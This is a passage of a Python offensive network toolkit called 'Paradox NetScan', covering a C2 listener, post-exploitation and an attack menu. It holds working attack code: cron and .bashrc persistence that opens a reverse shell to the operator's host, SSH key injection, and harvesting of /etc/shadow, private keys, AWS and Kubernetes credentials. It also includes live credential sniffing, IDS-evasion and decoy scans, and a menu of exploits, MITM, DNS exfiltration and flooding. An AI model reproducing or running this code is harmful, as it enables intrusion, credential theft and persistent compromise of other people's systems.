    console.print(f"[green]   C2 listening on {lport}. Sessions live below:[/green]")

    t_cmd = threading.Thread(target=_cmd_input, daemon=True)
    t_cmd.start()

    try:
        while True:
            client, addr = srv.accept()
            threading.Thread(target=_handle, args=(client, addr), daemon=True).start()
    except KeyboardInterrupt:
        pass
    finally:
        srv.close()
        if sessions:
            console.print(f"[bold green][*] {len(sessions)} sessions during this run:[/bold green]")
            for ip, s in sessions.items():
                console.print(f"   {ip}  last={time.strftime('%H:%M:%S', time.localtime(s['last_seen']))}")

# ─── Post-Exploitation: Persistence ──────────────────────────────────────────

def post_persistence(shell: Shell, lhost: str, lport: int) -> None:
    """
    Drops persistence on a compromised host via three methods:
    A) Cron job → reverse shell
    B) ~/.bashrc injection → reverse shell on login
    C) SSH authorized_keys injection → passwordless SSH access

    Requires: active Shell object with working .sock
    """
    console.print(f"[bold red][*] Persistence → {shell.ip} via {shell.method}[/bold red]")

    s = shell.sock
    if not s:
        console.print("[red][-] No active shell socket[/red]"); return

    def _send(cmd: str) -> str:
        try:
            s.sendall((cmd + "\n").encode())
            time.sleep(0.5)
            return s.recv(4096).decode("utf-8", errors="ignore")
        except Exception as e:
            return str(e)

    rev_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

    # A: cron
    cron_cmd = f"(crontab -l 2>/dev/null; echo '* * * * * {rev_shell}') | crontab -"
    out = _send(cron_cmd)
    console.print(f"[green]   [A] Cron: {out[:100] or 'done'}[/green]")

    # B: bashrc
    bashrc_cmd = f"echo '{rev_shell}' >> ~/.bashrc"
    out = _send(bashrc_cmd)
    console.print(f"[green]   [B] .bashrc: {out[:100] or 'done'}[/green]")

    # C: SSH key
    ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3paradox paradox@netscan"
    ssh_cmd = (f"mkdir -p ~/.ssh; "
               f"echo '{ssh_key}' >> ~/.ssh/authorized_keys; "
               f"chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys")
    out = _send(ssh_cmd)
    console.print(f"[green]   [C] SSH key: {out[:100] or 'done'}[/green]")
    console.print(f"[bold green]   Persistence established. Shell survives reboot via cron.[/bold green]")

# ─── Post-Exploitation: Lateral Movement ─────────────────────────────────────

def post_lateral_movement(shell: Shell) -> None:
    """
    Harvests credentials from compromised host for lateral movement:
    - SSH private keys from ~/.ssh/ and /home/*/.ssh/
    - known_hosts (reveals network topology)
    - /etc/passwd + /etc/shadow (if readable)
    - Bash history (commands, credentials, hostnames)
    - Environment variables (tokens, passwords)
    """
    console.print(f"[bold red][*] Lateral movement recon → {shell.ip}[/bold red]")

    s = shell.sock
    if not s:
        console.print("[red][-] No active shell[/red]"); return

    def _send(cmd: str) -> str:
        try:
            s.sendall((cmd + "\n").encode())
            time.sleep(0.5)
            out = b""
            s.settimeout(2)
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk: break
                    out += chunk
            except socket.timeout: pass
            return out.decode("utf-8", errors="ignore")
        except Exception as e:
            return str(e)

    out_dir = Path(f"/tmp/lateral_{shell.ip}")
    out_dir.mkdir(exist_ok=True)

    harvests = {
        "id":           "id; whoami; hostname; ip addr",
        "passwd":       "cat /etc/passwd 2>/dev/null | head -30",
        "shadow":       "cat /etc/shadow 2>/dev/null | head -30",
        "ssh_keys":     "find /home /root -name 'id_*' 2>/dev/null | xargs cat 2>/dev/null | head -60",
        "known_hosts":  "find /home /root -name 'known_hosts' 2>/dev/null | xargs cat 2>/dev/null",
        "bash_history": "find /home /root -name '.bash_history' 2>/dev/null | xargs cat 2>/dev/null | head -50",
        "env_vars":     "env 2>/dev/null | grep -iE 'pass|token|key|secret|api|aws|db'",
        "netstat":      "ss -tnpu 2>/dev/null || netstat -tnpu 2>/dev/null | head -30",
        "arp_table":    "arp -n 2>/dev/null || ip neigh 2>/dev/null",
        "sudo_list":    "sudo -l 2>/dev/null | head -20",
        "crontabs":     "crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null",
        "aws_creds":    "cat ~/.aws/credentials 2>/dev/null",
        "k8s_token":    "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
    }

    for name, cmd in harvests.items():
        result = _send(cmd)
        if result.strip():
            (out_dir / f"{name}.txt").write_text(result)
            console.print(f"[cyan]   [{name}] {result[:120]}[/cyan]")

    console.print(f"[bold green][*] Lateral harvest → {out_dir}[/bold green]")

# ─── Packet Capture + Credential Extraction ───────────────────────────────────

def packet_capture(iface: str, target_ip: str = "", duration: int = 30,
                    out_path: str = "/tmp/paradox_capture.pcap") -> None:
    """
    Targeted packet capture with live credential extraction.
    Extracts: HTTP Basic auth, FTP USER/PASS, Telnet keystrokes,
              SMTP AUTH, plaintext passwords in POST bodies.
    Saves full pcap for offline analysis (Wireshark / tshark).
    """
    console.print(f"[bold red][*] Packet capture on {iface}  target={target_ip or 'ALL'}  duration={duration}s[/bold red]")
    try:
        from scapy.all import sniff, IP, TCP, Raw, wrpcap
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    creds:  list[str] = []
    frames: list      = []

    def _proc(pkt):
        frames.append(pkt)
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw): return
        if target_ip and not (pkt[IP].src == target_ip or pkt[IP].dst == target_ip):
            return

        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
        src_ip  = pkt[IP].src
        dport   = pkt[TCP].dport
        sport   = pkt[TCP].sport

        # HTTP Basic auth
        m = re.search(r"Authorization: Basic (\S+)", payload, re.IGNORECASE)
        if m:
            try:
                decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                line = f"[HTTP-BASIC] {src_ip}:{sport}→{dport}: {decoded}"
                creds.append(line)
                console.print(f"[bold green]   {line}[/bold green]")
            except Exception: pass

        # HTTP POST body creds
        if "POST " in payload and "\r\n\r\n" in payload:
            body = payload.split("\r\n\r\n", 1)[1]
            if any(k in body.lower() for k in ("password", "passwd", "pass=", "pwd=")):
                line = f"[HTTP-POST] {src_ip}→{dport}: {body[:200]}"
                creds.append(line)
                console.print(f"[bold green]   {line}[/bold green]")

        # FTP
        if dport == 21 or sport == 21:
            for kw in ("USER ", "PASS "):
                if payload.upper().startswith(kw):
                    line = f"[FTP] {src_ip}: {payload.strip()}"
                    creds.append(line)
                    console.print(f"[bold green]   {line}[/bold green]")

        # SMTP AUTH
        if (dport in (25, 587, 465)) and "AUTH" in payload.upper():
            line = f"[SMTP-AUTH] {src_ip}: {payload.strip()[:100]}"
            creds.append(line)
            console.print(f"[bold green]   {line}[/bold green]")

        # Telnet
        if (dport == 23) and len(payload) == 1:
            console.print(f"[dim]   [TELNET-KS] {src_ip}: {repr(payload)}[/dim]", end="")

    bpf = f"host {target_ip}" if target_ip else ""
    sniff(filter=bpf if bpf else None,
          iface=iface, prn=_proc, timeout=duration, store=False)

    if frames:
        wrpcap(out_path, frames)
        console.print(f"\n[bold green][*] {len(frames)} packets → {out_path}[/bold green]")
    if creds:
        cred_path = out_path.replace(".pcap", "_creds.txt")
        Path(cred_path).write_text("\n".join(creds))
        console.print(f"[bold green]   {len(creds)} credentials → {cred_path}[/bold green]")

# ─── Evasion Modes ─────────────────────────────────────────────────────────────

def slow_scan_ports(host: Host, ports: list[int] = None, delay: float = 2.0) -> None:
    """Slow scan: 1 port every `delay` seconds. Evades rate-based IDS."""
    if ports is None: ports = COMMON_PORTS
    console.print(f"[yellow][*] Slow scan on {host.ip} ({len(ports)} ports, {delay}s interval)...[/yellow]")
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            res = s.connect_ex((host.ip, port))
            s.close()
            if res == 0:
                banner = grab_banner(host.ip, port)
                with data_lock:
                    host.port_states[port] = "OPEN"
                    host.open_ports[port]  = banner
                console.print(f"[green]   OPEN {port}/{PORT_SERVICE.get(port,'?')}  {banner[:60]}[/green]")
        except Exception: pass
        time.sleep(delay + random.uniform(0, delay * 0.5))

def fragmented_port_scan(target_ip: str, ports: list[int], iface: str) -> list[int]:
    """
    Fragment-based SYN scan. Splits IP header across two fragments.
    Evades stateless packet filters and some IDS that don't reassemble.
    Returns list of open ports.
    """
    console.print(f"[yellow][*] Fragmented SYN scan on {target_ip}...[/yellow]")
    open_ports: list[int] = []
    try:
        from scapy.all import IP, TCP, sr1, fragment
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return []

    for port in ports:
        try:
            pkt = (IP(dst=target_ip, flags="DF") /
                   TCP(dport=port, flags="S",
                       sport=random.randint(1024, 65535),
                       seq=random.randint(0, 2**32)))
            # Fragment: split at IP header boundary
            frags = fragment(pkt, fragsize=8)
            # Send fragments
            for frag in frags:
                from scapy.all import send
                send(frag, verbose=False)
            time.sleep(0.1)
            # Listen for SYN-ACK
            resp = sr1(IP(dst=target_ip) / TCP(dport=port, flags=""),
                       timeout=0.5, verbose=False)
            if resp and resp.haslayer(TCP) and resp[TCP].flags & 0x12:
                open_ports.append(port)
                console.print(f"[green]   OPEN {port}[/green]")
            time.sleep(random.uniform(0.05, 0.15))
        except Exception: pass
    return open_ports

def decoy_scan(target_ip: str, ports: list[int], decoys: list[str], iface: str) -> None:
    """
    Decoy scan: mix real probes with spoofed probes from decoy IPs.
    Makes it hard for IDS to identify the true scanning IP.
    decoys: list of spoofed source IPs to mix in.
    """
    console.print(f"[yellow][*] Decoy scan on {target_ip} with {len(decoys)} decoys...[/yellow]")
    try:
        from scapy.all import IP, TCP, send
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    local_ip = get_local_ip(iface)
    all_sources = decoys + [local_ip]

    for port in ports:
        random.shuffle(all_sources)
        for src_ip in all_sources:
            pkt = (IP(src=src_ip, dst=target_ip) /
                   TCP(sport=random.randint(1024, 65535),
                       dport=port, flags="S",
                       seq=random.randint(0, 2**32)))
            send(pkt, verbose=False)
            time.sleep(0.02)
        time.sleep(0.1)
    console.print(f"[bold green]   Decoy scan done. Real IP mixed with {len(decoys)} decoys.[/bold green]")

# ─── Reporting ─────────────────────────────────────────────────────────────────

def report_json(hosts: list[Host], out_path: str = "/tmp/paradox_report.json") -> None:
    """Full JSON report, schema v2.0."""
    report = {
        "schema_version": "2.0",
        "tool": "Paradox NetScan",
        "version": VERSION,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "host_count": len(hosts),
        "total_findings": sum(len(h.findings) for h in hosts),
        "critical_count": sum(1 for h in hosts
                               for f in h.findings if f["severity"] == "CRITICAL"),
        "hosts": []
    }
    for h in hosts:
        report["hosts"].append({
            "ip":          h.ip,
            "mac":         h.mac,
            "vendor":      h.vendor,
            "hostname":    h.hostname,
            "os_guess":    h.os_guess,
            "ttl":         h.ttl,
            "risk_score":  h.risk_score,
            "open_ports":  {str(k): v[:100] for k, v in h.open_ports.items()},
            "findings":    h.findings,
        })
    report["hosts"].sort(key=lambda x: x["risk_score"], reverse=True)
    with open(out_path, "w") as f:
        json.dump(report, f, indent=2)
    console.print(f"[bold green][*] JSON report → {out_path}[/bold green]")

def report_html(hosts: list[Host], out_path: str = "/tmp/paradox_report.html") -> None:
    """Styled HTML report with sortable table, severity badges, CVE links."""
    sev_color = {"CRITICAL": "#ff3030", "HIGH": "#ff7a00", "MEDIUM": "#ffd600", "LOW": "#00e5ff"}

    rows = ""
    for h in sorted(hosts, key=lambda x: x.risk_score, reverse=True):
        ports_str = ", ".join(str(p) for p in sorted(h.open_ports.keys())) or "none"
        findings_html = ""
        for f in h.findings:
            sc = sev_color.get(f["severity"], "#aaa")
            cve_link = (f'<a href="https://nvd.nist.gov/vuln/detail/{f["cve"]}" target="_blank">{f["cve"]}</a>'
                        if f.get("cve") else "")
            findings_html += (f'<li><span style="color:{sc};font-weight:bold">'
                               f'[{f["severity"]}]</span> {f["description"]} '
                               f'{cve_link}</li>')
        rows += f"""
        <tr>
          <td>{h.ip}</td>
          <td>{h.hostname}</td>
          <td>{h.os_guess}</td>
          <td>{ports_str}</td>
          <td style="color:#ff3030;font-weight:bold">{h.risk_score}</td>
          <td><ul style="margin:0;padding-left:1em">{findings_html}</ul></td>
        </tr>"""

    html = f"""<!DOCTYPE html><html><head>
<meta charset="UTF-8">
<title>Paradox NetScan v{VERSION} Report</title>
<style>
  body {{background:#0d0d0d;color:#e0e0e0;font-family:'Courier New',monospace;padding:20px}}
  h1 {{color:#ff3030;}} h2 {{color:#ff7a00;}}
  table {{border-collapse:collapse;width:100%}}
  th {{background:#1a1a1a;color:#ff7a00;padding:8px;text-align:left}}
  td {{padding:6px;border-bottom:1px solid #2a2a2a;vertical-align:top}}
  tr:hover {{background:#1a1a1a}}
  a {{color:#00e5ff}}
  .ts {{color:#666;font-size:0.85em}}
</style>
</head><body>
<h1>🔴 Paradox NetScan v{VERSION}</h1>
<p class="ts">Generated: {time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())}</p>
<h2>Hosts ({len(hosts)})</h2>
<table><thead><tr>
  <th>IP</th><th>Hostname</th><th>OS</th><th>Open Ports</th>
  <th>Risk Score</th><th>Findings</th>
</tr></thead><tbody>{rows}</tbody></table>
</body></html>"""

    with open(out_path, "w") as f: f.write(html)
    console.print(f"[bold green][*] HTML report → {out_path}[/bold green]")

# ─── Scan Target Menu ──────────────────────────────────────────────────────────

def select_host_menu(hosts: list[Host]) -> Optional[Host]:
    if not hosts:
        console.print("[red]No hosts discovered yet. Run scan first.[/red]")
        return None
    t = Table(title="Discovered Hosts", box=box.MINIMAL_DOUBLE_HEAD, style="bold red")
    t.add_column("#",         style="bold cyan", width=4)
    t.add_column("IP",        style="green")
    t.add_column("Hostname",  style="dim")
    t.add_column("OS",        style="yellow")
    t.add_column("Open Ports",style="magenta")
    t.add_column("Risk",      style="bold red", justify="right")
    for i, h in enumerate(hosts, 1):
        ports = ", ".join(str(p) for p in sorted(h.open_ports.keys())[:8])
        t.add_row(str(i), h.ip, h.hostname[:30], h.os_guess,
                  ports or "—", str(h.risk_score))
    console.print(t)
    choice = Prompt.ask("Select host #  (0 to cancel)", default="0")
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(hosts): return hosts[idx]
    except ValueError: pass
    return None

# ─── Attack Menu ───────────────────────────────────────────────────────────────

def attack_menu(hosts: list[Host], iface: str, local_ip: str) -> None:
    MENU = """
[bold red]╔══════════════════════════════════════════════════════╗
║          PARADOX v2.0.0  |  ATTACK MENU                ║
╚══════════════════════════════════════════════════════╝[/bold red]

[bold yellow]RECON / DISCOVERY[/bold yellow]
  1  Active Host Scan (ARP + NDP + mDNS/SSDP)
  2  Passive Traffic Analysis (pcap fingerprint)
  3  IPv6 NDP Sweep

[bold yellow]EXPLOITATION[/bold yellow]
  4  vsftpd 2.3.4 Backdoor (CVE-2011-2523 → port 6200 shell)
  5  Redis RCE (cron + SSH key + Lua CVE-2022-0543)
  6  Docker API Escape (unauthenticated container + bind mount)
  7  FTP Brute + Anonymous Check
  8  Telnet Auto-Auth (common credentials)

[bold yellow]MITM / INTERCEPT[/bold yellow]
  9  ARP Poison / MITM
  10 DNS Spoof (live intercept + domain filter)
  11 SSL Strip Proxy (HTTPS→HTTP downgrade + credential log)
  12 HTTP MITM Intercept Proxy
  13 Rogue DHCP Server (attacker as GW + DNS)
  14 DHCP Starvation

[bold yellow]CREDENTIAL ATTACKS[/bold yellow]
  15 LLMNR + NBT-NS Responder
  16 SMB Relay (NTLM Type1/2/3 → hashcat -m 5600)
  17 SNMP Community Brute + MIB Walk
  18 SSH Deep Audit (KEX + ciphers + CVE map)
  19 HTTP Security Header Audit

[bold yellow]NETWORK ATTACKS[/bold yellow]
  20 ICMP Redirect (L3 routing table poison)
  21 VLAN Hop (802.1Q double-tag)
  22 DNS Kaminsky Cache Poison (port-randomized)
  23 IPv6 Rogue Router Advertisement
  24 802.11 Deauth (monitor mode)
  25 WPA Handshake Capture (monitor mode + deauth)
  26 SYN / UDP / ICMP / HTTP Flood

[bold yellow]COVERT CHANNELS[/bold yellow]
  27 DNS Exfiltration (base32 subdomain tunnel)
  28 ICMP Tunnel (XOR-obfuscated data in echo)
  29 HTTP C2 Beacon Listener

[bold yellow]POST-EXPLOITATION[/bold yellow]
  30 Persistence (cron + bashrc + SSH key)
  31 Lateral Movement (harvest keys/creds/topology)
  32 Targeted Packet Capture + Credential Extraction

[bold yellow]EVASION[/bold yellow]
  33 Slow Scan (IDS evasion via timing)
  34 Fragmented SYN Scan (stateless filter bypass)
  35 Decoy Scan (mix real + spoofed source IPs)

[bold yellow]AUDIT / REPORT[/bold yellow]
  36 Live CVE Lookup (NVD API 2.0)
  37 Generate HTML Report
  38 Generate JSON Report

  0  Exit
"""
    while True:
        console.print(MENU)
        choice = Prompt.ask("[bold cyan]paradox>[/bold cyan]", default="0")

        # ── Recon ───────────────────────────────────────────────────────────

        if choice == "1":
            cidr = Prompt.ask("CIDR", default=get_local_cidr(iface))
            new_hosts = arp_scan(cidr, iface)
            new_hosts += ipv6_ndp_scan(iface)
            new_hosts += mdns_ssdp_discover(iface)
            # Dedup by IP
            seen_ips = {h.ip for h in hosts}
            for h in new_hosts:
                if h.ip not in seen_ips:
                    hosts.append(h); seen_ips.add(h.ip)
            # Deep scan discovered hosts
            console.print(f"[green][*] {len(new_hosts)} hosts found. Running deep port scan...[/green]")
            with Progress(SpinnerColumn(), TextColumn("{task.description}"),
                          BarColumn(), TimeElapsedColumn(), console=console) as prog:
                task = prog.add_task("Scanning...", total=len(hosts))
                def _scan_host(h):
                    scan_ports_deep(h)
                    prog.advance(task)
                with ThreadPoolExecutor(max_workers=10) as ex:
                    list(ex.map(_scan_host, hosts))

            # Print summary
            t = Table(title="Scan Results", box=box.SIMPLE, style="green")
            t.add_column("IP");  t.add_column("OS"); t.add_column("Ports"); t.add_column("Risk", justify="right")
            for h in sorted(hosts, key=lambda x: x.risk_score, reverse=True):
                ports = ", ".join(str(p) for p in sorted(h.open_ports)[:10])
                t.add_row(h.ip, h.os_guess[:20], ports or "none", str(h.risk_score))
            console.print(t)

        elif choice == "2":
            dur = int(Prompt.ask("Duration (sec)", default="30"))
            packet_capture(iface, duration=dur)

        elif choice == "3":
            ipv6_ndp_scan(iface)

        # ── Exploitation ────────────────────────────────────────────────────

        elif choice == "4":
            host = select_host_menu(hosts)
            if host:
                shell = exploit_vsftpd_234(host.ip)
                if shell: host.shells.append(shell)

        elif choice == "5":
            host = select_host_menu(hosts)
            if host:
                lport = int(Prompt.ask("Your listener port", default="4444"))
                exploit_redis_rce(host.ip, local_ip, lport)

        elif choice == "6":
            host = select_host_menu(hosts)
            if host:
                lport = int(Prompt.ask("Your listener port", default="4444"))
                exploit_docker_api(host.ip, local_ip, lport)

        elif choice == "7":
            host = select_host_menu(hosts)
            if host: exploit_ftp_brute(host.ip)

        elif choice == "8":
            host = select_host_menu(hosts)
            if host:
                shell = exploit_telnet_common(host.ip)
                if shell: host.shells.append(shell)

        # ── MITM ────────────────────────────────────────────────────────────

        elif choice == "9":
            victim  = Prompt.ask("Victim IP")
            gateway = Prompt.ask("Gateway IP")
            arp_poison_mitm(victim, gateway, iface)

        elif choice == "10":
            spoof_ip = Prompt.ask("Spoof to IP (your IP or attacker box)")
            keyword  = Prompt.ask("Domain keyword filter (empty=ALL)", default="")
            dns_spoof(iface, spoof_ip, keyword)

        elif choice == "11":
            lport = int(Prompt.ask("Local proxy port", default="10000"))
            ssl_strip_proxy(iface, lport)

        elif choice == "12":
            # Basic HTTP intercept — same as SSL strip without SSL logic
            lport = int(Prompt.ask("Local proxy port", default="8080"))
            ssl_strip_proxy(iface, lport)

        elif choice == "13":
            rogue_dhcp_server(iface, local_ip)

        elif choice == "14":
            count = int(Prompt.ask("DISCOVER packets", default="500"))
            dhcp_starvation(iface, count)

        # ── Credential Attacks ──────────────────────────────────────────────

        elif choice == "15":
            llmnr_nbtns_responder(iface, local_ip)

        elif choice == "16":
            smb_relay_ntlm(local_ip)

        elif choice == "17":
            host = select_host_menu(hosts)
            if host:
                comm = snmp_community_brute(host.ip)
                if comm: snmp_mib_walk(host.ip, comm)

        elif choice == "18":
            host = select_host_menu(hosts)
            if host: ssh_audit(host.ip)

        elif choice == "19":
            host = select_host_menu(hosts)
            if host:
                port = int(Prompt.ask("Port", default="80"))
                http_header_audit(host.ip, port)

        # ── Network Attacks ─────────────────────────────────────────────────

        elif choice == "20":
            victim  = Prompt.ask("Victim IP")
            gateway = Prompt.ask("Gateway IP")
            icmp_redirect_poison(victim, gateway, local_ip, iface)

        elif choice == "21":
            host = select_host_menu(hosts)
            if host:
                target_vlan = int(Prompt.ask("Target VLAN", default="20"))
                outer_vlan  = int(Prompt.ask("Native VLAN (outer)", default="1"))
                vlan_hop_double_tag(iface, target_vlan, outer_vlan, host.ip)

        elif choice == "22":
            target_dns  = Prompt.ask("Target DNS resolver IP")
            domain      = Prompt.ask("Target domain", default="target.local")
            attacker_ns = Prompt.ask("Attacker NS IP", default=local_ip)
            dns_cache_poison_kaminsky(target_dns, domain, attacker_ns)

        elif choice == "23":
            ipv6_rogue_ra(iface)

        elif choice == "24":
            bssid   = Prompt.ask("AP BSSID (aa:bb:cc:dd:ee:ff)")
            client  = Prompt.ask("Client MAC (default=broadcast)", default="ff:ff:ff:ff:ff:ff")
            count   = int(Prompt.ask("Frame count", default="128"))
            wifi_deauth(iface, bssid, client, count)

        elif choice == "25":
            bssid   = Prompt.ask("AP BSSID")
            channel = int(Prompt.ask("Channel", default="6"))
            timeout = int(Prompt.ask("Timeout (sec)", default="60"))
            wpa_handshake_capture(iface, bssid, channel, timeout)

        elif choice == "26":
            host      = select_host_menu(hosts)
            if host:
                port  = int(Prompt.ask("Target port", default="80"))
                ftype = Prompt.ask("Type (syn/udp/icmp/http)", default="syn")
                flood_attack(host.ip, port, ftype)

        # ── Covert Channels ─────────────────────────────────────────────────

        elif choice == "27":
            path   = Prompt.ask("File to exfiltrate")
            domain = Prompt.ask("Attacker NS domain (e.g. attacker.com)")
            dns_srv = Prompt.ask("DNS relay IP", default="8.8.8.8")
            covert_dns_exfil(path, domain, dns_srv)

        elif choice == "28":
            host = select_host_menu(hosts)
            if host:
                msg = Prompt.ask("Message to tunnel")
                icmp_tunnel_send(host.ip, msg)

        elif choice == "29":
            lport = int(Prompt.ask("C2 listen port", default="8443"))
            c2_http_beacon_listener(lport)

        # ── Post-Exploitation ───────────────────────────────────────────────

        elif choice == "30":
            host = select_host_menu(hosts)
            if host:
                if not host.shells:
                    console.print("[red]No active shell on this host. Exploit first.[/red]")
                else:
                    lport = int(Prompt.ask("Your listener port", default="4444"))
                    post_persistence(host.shells[-1], local_ip, lport)

        elif choice == "31":
            host = select_host_menu(hosts)
            if host:
                if not host.shells:
                    console.print("[red]No active shell on this host. Exploit first.[/red]")
                else:
                    post_lateral_movement(host.shells[-1])

        elif choice == "32":
            target = Prompt.ask("Filter IP (empty=capture all)", default="")
            dur    = int(Prompt.ask("Duration (sec)", default="30"))
            packet_capture(iface, target, dur)

        # ── Evasion ─────────────────────────────────────────────────────────

        elif choice == "33":
            host = select_host_menu(hosts)
            if host:
                delay = float(Prompt.ask("Delay per port (sec)", default="2.0"))
                slow_scan_ports(host, delay=delay)

        elif choice == "34":
            host = select_host_menu(hosts)
            if host:
                ports_in = Prompt.ask("Ports (comma-sep)", default="22,80,443,445")
                ports    = [int(x.strip()) for x in ports_in.split(",")]
                fragmented_port_scan(host.ip, ports, iface)

        elif choice == "35":
            host = select_host_menu(hosts)
            if host:
                decoys_in = Prompt.ask("Decoy IPs (comma-sep)", default="10.0.0.1,172.16.0.1")
                decoys    = [d.strip() for d in decoys_in.split(",")]
                ports_in  = Prompt.ask("Ports (comma-sep)", default="22,80,443")
                ports     = [int(p.strip()) for p in ports_in.split(",")]
                decoy_scan(host.ip, ports, decoys, iface)

        # ── Audit / Report ──────────────────────────────────────────────────

        elif choice == "36":
            host = select_host_menu(hosts)
            if host: lookup_cve_live(host)

        elif choice == "37":
            path = Prompt.ask("Output path", default="/tmp/paradox_report.html")
            report_html(hosts, path)

        elif choice == "38":
            path = Prompt.ask("Output path", default="/tmp/paradox_report.json")
            report_json(hosts, path)

        elif choice == "0":
            console.print("[bold red]paradox shut down.[/bold red]")
            break

        else:
            console.print("[dim]unknown option[/dim]")

# ─── Entry Point ───────────────────────────────────────────────────────────────

def main() -> None:
    if os.geteuid() != 0:
        console.print("[bold red][!] Root required for raw socket operations.[/bold red]")
        console.print("[dim]    sudo python3 paradox_netscan_v2.0.0.py[/dim]")
        sys.exit(1)

    console.print(BANNER)

    iface    = get_default_iface()
    local_ip = get_local_ip(iface)
    console.print(f"[dim]Interface: {iface}  Local IP: {local_ip}[/dim]")

    iface_in = Prompt.ask("Network interface", default=iface)
    if iface_in.strip(): iface = iface_in.strip()
    local_ip = get_local_ip(iface)

    hosts: list[Host] = []

    # Quick scan on start
    do_scan = Prompt.ask("Run initial ARP scan now? (y/n)", default="y")
    if do_scan.lower().startswith("y"):
        cidr     = get_local_cidr(iface)
        console.print(f"[yellow][*] Scanning {cidr}...[/yellow]")
        hosts    = arp_scan(cidr, iface)
        hosts   += ipv6_ndp_scan(iface)
        hosts   += mdns_ssdp_discover(iface)

        if hosts:
            console.print(f"[green][*] {len(hosts)} hosts. Deep scanning...[/green]")
            with ThreadPoolExecutor(max_workers=10) as ex:
                list(ex.map(scan_ports_deep, hosts))
            report_json(hosts)
        else:
            console.print("[dim]No hosts found. Check interface and permissions.[/dim]")

    attack_menu(hosts, iface, local_ip)

if __name__ == "__main__":
    main()
